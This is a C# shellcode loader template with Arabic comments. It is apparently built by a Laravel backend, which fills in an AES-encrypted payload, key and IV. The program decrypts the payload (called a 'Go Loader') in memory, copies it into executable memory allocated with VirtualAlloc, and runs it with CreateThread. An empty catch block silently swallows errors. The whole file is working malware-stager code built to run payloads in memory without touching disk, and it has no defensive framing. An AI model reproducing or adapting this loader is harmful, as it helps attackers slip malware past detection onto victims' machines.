using System;
using System.IO;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    // سيتم استبدال هذه البيانات من Laravel
    static byte[] encryptedData = new byte[] { __ENCRYPTED_DATA__ };
    static byte[] key = new byte[] { __AES_KEY__ };
    static byte[] iv = new byte[] { __AES_IV__ };

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static void Main()
    {
        try
        {
            // 1. فك تشفير البايلود (Go Loader) في الذاكرة
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                
                using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msOutput = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msOutput);
                            byte[] decryptedBytes = msOutput.ToArray();

                            // 2. تنفيذ البايلود من الذاكرة (In-Memory Execution)
                            // سنستخدم طريقة VirtualAlloc و CreateThread لتشغيل الكود
                            uint PAGE_EXECUTE_READWRITE = 0x40;
                            uint MEM_COMMIT = 0x1000;
                            uint MEM_RESERVE = 0x2000;

                            IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)decryptedBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                            
                            if (ptr == IntPtr.Zero)
                                return;

                            Marshal.Copy(decryptedBytes, 0, ptr, decryptedBytes.Length);

                            IntPtr hThread = CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
                            WaitForSingleObject(hThread, 0xFFFFFFFF);
                        }
                    }
                }
            }
        }
        catch
        {
        }
    }
}